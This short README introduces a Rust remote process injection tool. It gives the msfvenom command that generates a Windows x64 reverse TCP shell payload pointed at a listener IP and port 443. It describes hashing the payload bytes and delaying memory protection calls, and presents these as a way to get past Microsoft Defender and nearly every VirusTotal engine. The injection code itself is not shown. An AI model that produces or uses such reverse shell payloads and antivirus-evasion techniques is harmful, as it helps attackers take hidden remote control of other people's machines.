# Remote Process Injection

The following is an example of remote process injection written in Rust using the [windows](https://crates.io/crates/windows) crate.
The payload is the result of taking each byte from `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.40 LPORT=443 -f rust` and md5 hashing them.
Just using simple hashing algorithim and a timed delay on memory protection operations bypasses Defender and all but three from VirusTotal.
![VirusTotal](https://media.discordapp.net/attachments/1104486226813272225/1227680247550447790/image.png?ex=66294954&is=6616d454&hm=327d142338b956cb96c7a1246d7796b281a61975322051e18d679c1067193925&=&format=webp&quality=lossless&width=845&height=923)
